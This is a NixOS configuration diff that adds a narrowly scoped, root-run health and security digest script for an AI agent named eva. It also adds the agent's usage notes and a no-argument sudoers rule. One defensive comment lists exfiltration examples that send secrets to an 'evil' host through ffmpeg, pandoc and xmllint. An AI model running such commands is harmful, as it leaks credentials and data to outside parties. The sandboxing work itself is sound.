@@ -40,6 +40,87 @@ let
     '';
   };
 
+  # Daily health/security digest, run as root through sudo like eva-journal.
+  # Single-purpose on purpose: the Prometheus queries are baked in at build
+  # time (NOT read from eva's writable workspace), the endpoint is fixed to
+  # loopback, it takes no arguments, and the 24h sshd/auth journal comes out
+  # as COUNTS and source IPs only — never raw lines (sudo COMMAND= strings
+  # can carry secrets). That gives eva the security signal without handing
+  # back the whole-box journal the 2026-09-19 audit took away.
+  healthQueries = {
+    targets_down = ''up == 0'';
+    failed_units = ''node_systemd_unit_state{state="failed"} == 1'';
+    filesystems_over_85pct = ''100 * (1 - node_filesystem_avail_bytes{fstype!~"tmpfs|ramfs|overlay|squashfs|nsfs|efivarfs"} / node_filesystem_size_bytes{fstype!~"tmpfs|ramfs|overlay|squashfs|nsfs|efivarfs"}) > 85'';
+    filesystems_readonly = ''node_filesystem_readonly{fstype!~"tmpfs|ramfs|overlay|squashfs|nsfs|efivarfs"} == 1'';
+    memory_available_pct = ''100 * node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes'';
+    load15_per_cpu = ''node_load15 / count without (cpu, mode) (node_cpu_seconds_total{mode="idle"})'';
+    smart_unhealthy = ''smartctl_device_smart_status != 1'';
+    smart_critical_warning = ''smartctl_device_critical_warning > 0'';
+    disk_temperature_c = ''smartctl_device_temperature{temperature_type="current"}'';
+    btrfs_device_errors = ''node_btrfs_device_errors_total > 0'';
+    uptime_seconds = ''time() - node_boot_time_seconds'';
+  };
+  serverHealthCheck = pkgs.writeShellApplication {
+    name = "server-health-check";
+    runtimeInputs = [ pkgs.coreutils pkgs.curl pkgs.jq pkgs.systemd ];
+    text = ''
+      if [ "$#" -ne 0 ]; then
+        echo "server-health-check: takes no arguments" >&2; exit 1
+      fi
+      queries=${lib.escapeShellArg (builtins.toJSON healthQueries)}
+
+      # Each query -> [{labels, value}], or {error} if Prometheus is unreachable.
+      prom="{}"
+      for name in $(jq -r 'keys[]' <<<"$queries"); do
+        q=$(jq -r --arg n "$name" '.[$n]' <<<"$queries")
+        if res=$(curl -sf --max-time 10 --get \
+                   --data-urlencode "query=$q" \
+                   http://127.0.0.1:${toString config.services.prometheus.port}/api/v1/query); then
+          val=$(jq -c '[.data.result[]
+                        | {labels: (.metric | del(.__name__, .instance, .job)),
+                           value: .value[1]}]' <<<"$res")
+        else
+          val='{"error":"prometheus query failed"}'
+        fi
+        prom=$(jq -c --arg n "$name" --argjson v "$val" '. + {($n): $v}' <<<"$prom")
+      done
+
+      # MESSAGE is a byte array when not valid UTF-8; normalise to a string.
+      msgs='.[] | (.MESSAGE | if type == "array" then implode else . end)'
+
+      ssh=$(journalctl -q --no-pager -o json --since -24h -u sshd.service \
+        | jq -s "[$msgs]" | jq -c '
+          def ip: capture("(from |user \\S+ )(?<ip>[0-9a-fA-F.:]+) port").ip;
+          ([.[] | select(test("^Accepted "))]) as $ok
+          | ([.[] | select(test("^(Invalid user|Failed |Connection (closed|reset) by (invalid|authenticating) user)"))]) as $bad
+          | {accepted_logins: ($ok | map(capture("^Accepted (?<method>\\S+) for (?<user>\\S+) from (?<ip>\\S+)"))
+                               | group_by([.user, .ip, .method])
+                               | map(.[0] + {count: length})),
+             failed_attempts: ($bad | length),
+             invalid_user_attempts: ([$bad[] | select(test("[Ii]nvalid user"))] | length),
+             top_failed_sources: ($bad | map(ip // "unknown") | group_by(.)
+                                  | map({ip: .[0], count: length})
+                                  | sort_by(-.count) | .[:10])}')
+
+      auth=$(journalctl -q --no-pager -o json --since -24h \
+               SYSLOG_FACILITY=4 SYSLOG_FACILITY=10 \
+        | jq -s -c '
+          [.[] | {id: .SYSLOG_IDENTIFIER,
+                  m: (.MESSAGE | if type == "array" then implode else . end)}]
+          | {sudo_by_user: ([.[] | select(.id == "sudo")
+                              | .m | capture("^\\s*(?<user>\\S+) : .*USER=(?<as>\\S+) ;")]
+                            | group_by([.user, .as])
+                            | map({user: .[0].user, as: .[0].as, count: length})),
+             auth_failures: ([.[] | select(.m | test("authentication failure|password check failed|incorrect password|a password is required|FAILED (SU|LOGIN)"))]
+                             | group_by(.id) | map({source: .[0].id, count: length}))}')
+
+      jq -n --arg host ${config.networking.hostName} --arg at "$(date -Is)" \
+        --argjson prometheus "$prom" --argjson ssh "$ssh" --argjson auth "$auth" \
+        '{host: $host, generated_at: $at, window: "24h",
+          prometheus: $prometheus, ssh: $ssh, auth: $auth}'
+    '';
+  };
+
   # The owner's own addresses eva may email without a per-send approval. Defined
   # ONCE and shared by BOTH outbound mail wrappers so the two lists can never
   # drift apart: send-trusted-mail (actions.trustedMail.trustedAddresses, which
@@ -304,6 +385,24 @@ in
 
       OCR: tesseract carries English/Spanish/Catalan data — select with `-l spa` /
       `-l cat` on the CLI, or `pytesseract.image_to_string(img, lang="spa")`.
+
+      Server diagnostics (root-run wrappers; invoke them with `sudo` and the
+      EXACT path shown — sudo only accepts that path):
+
+      ${lib.optionalString config.my.server-stats.enable ''
+      - `sudo ${lib.getExe serverHealthCheck}` — daily health and security
+        digest as JSON, no arguments: Prometheus checks (targets down, failed
+        units, filesystems over 85% or read-only, memory, load per CPU, SMART
+        status/warnings/temperatures, btrfs device errors, uptime) plus the last
+        24h of sshd and auth activity summarised as counts (accepted logins by
+        user/IP, failed and invalid-user attempts, top failing source IPs, sudo
+        use by user, auth failures). Empty lists mean nothing to report.
+      ''}- `sudo ${lib.getExe evaJournal} <unit> [lines]` — the journal of one of
+        the units you manage (${lib.concatStringsSep ", " evaManagedUnits}),
+        without the `.service` suffix.
+
+      You are NOT in the systemd-journal group: a plain `journalctl` shows
+      only your own logs. Use these wrappers instead of trying to widen that.
 
       This host has NO GPU. Use CPU-friendly methods (scikit-learn) for modelling;
       no deep-learning frameworks (torch/TensorFlow/CUDA) are installed.
@@ -665,6 +764,11 @@ in
       # invocation of those still prompts. (`lp -h <remote>` could target another
       # IPP server, but eva's default destination is the local daemon.)
       "lp" "lpr" "lpstat" "lpq" "lprm" "cancel" "lpoptions"
+      # The daily health digest (see serverHealthCheck above). Blessed by NAME
+      # only — deliberately not curl: the script's fixed loopback queries are
+      # the whole capability. Like the rest of this list it is inert under
+      # claude-cli; the real gate is the argument-less sudoers entry.
+      "server-health-check"
       # ffmpeg/ffprobe/pandoc/xmllint are network-capable — `ffmpeg -i
       # http://evil/<secret>`, `pandoc https://evil/<secret>` (or its
       # --lua-filter RCE), `xmllint http://evil/<secret>` — so they are NOT
@@ -931,7 +1035,8 @@ in
   #   * `systemctl restart <unit>` for exactly the managed units — sudoers
   #     matches the full argument string, so no other verb or unit passes;
   #   * shutdown/reboot with any args (power management is availability-only);
-  #   * the eva-journal wrapper (validated unit + line count, --no-pager).
+  #   * the eva-journal wrapper (validated unit + line count, --no-pager);
+  #   * server-health-check (fixed queries, no arguments, counts not raw logs).
   # nixos-rebuild is gone entirely: a rebuild is not an agent operation.
   # Paths are the NixOS profile symlinks `sudo` resolves. This is the single
   # source of truth for eva's sudo access.
@@ -942,7 +1047,11 @@ in
       "/run/current-system/sw/bin/shutdown"
       "/run/current-system/sw/bin/reboot"
       (lib.getExe evaJournal)
-    ];
+    ]
+    # Only where Prometheus runs (it queries server-stats' instance).
+    # `""` = no arguments allowed (the script refuses them anyway).
+    ++ lib.optional config.my.server-stats.enable
+      "${lib.getExe serverHealthCheck} \"\"";
 
   # Eva's ONLY grant into alex's tree is write access to the acpuchades-site
   # repo (she maintains it). Everything else is deliberately dropped: no
